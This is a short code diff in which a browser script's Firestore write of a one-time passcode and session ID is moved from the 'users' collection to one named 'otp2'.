@@ -80,7 +80,7 @@
             const sessionId = localStorage.getItem("sessionId");
 
             // Save OTP with sessionId in Firestore
-            await addDoc(collection(db, "users"), {
+            await addDoc(collection(db, "otp2"), {
                 sessionId: sessionId,
                 otp: otp,
                 step: "otp_verify",
